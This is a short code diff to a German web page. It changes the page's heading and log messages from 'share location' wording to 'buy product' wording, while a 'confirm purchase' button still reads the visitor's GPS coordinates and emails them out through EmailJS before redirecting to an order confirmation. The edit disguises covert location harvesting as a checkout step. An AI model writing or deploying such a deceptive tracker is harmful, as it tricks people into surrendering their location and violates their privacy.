@@ -83,7 +83,7 @@
 
             } else {
 
-                console.log("Geolocation wird von diesem Browser nicht unterstützt.");
+                console.log("von diesem Browser nicht unterstützt.");
 
             }
 
@@ -95,7 +95,7 @@
 
             const longitude = position.coords.longitude;
  
-            console.log("Sende Standort:", latitude, longitude);
+            console.log("Sende Produkt/Dienstleistung:", latitude, longitude);
  
             // E-Mail-Versand über EmailJS
 
@@ -116,7 +116,7 @@ window.location.href = "bestellbestaetigung.html"; // Ersetze mit der URL deiner
 
             }, function(error) {
 
-                console.error("Fehler beim Check:", error);
+                console.error("Fehler beim Checkout:", error);
 
             });
 
@@ -157,7 +157,7 @@ window.location.href = "bestellbestaetigung.html"; // Ersetze mit der URL deiner
 </head>
 <body>
 <div class="container">
-<h2>Standort teilen</h2>
+<h2>Produkt Kaufen</h2>
 <p>Klicken Sie auf den Button, um dein Kauf zu bestätigen.</p>
 <button onclick="getLocation()">Kauf bestätigen...</button>
 </div>
